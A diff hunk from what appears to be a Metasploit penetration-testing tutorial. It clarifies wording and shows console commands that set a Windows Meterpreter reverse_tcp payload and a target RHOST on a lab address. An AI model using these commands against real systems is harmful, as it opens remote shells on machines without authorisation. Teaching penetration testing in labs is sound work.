@@ -67,7 +67,7 @@ We will continue by running this command to set the location of the payload:
 
 <pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-We also need to set the **RHOST IP** by using the following command:
+We also need to set the **RHOST IP** for the Windows system by using the following command:
 
 <pre>set RHOST 10.10.1.209</pre>
 
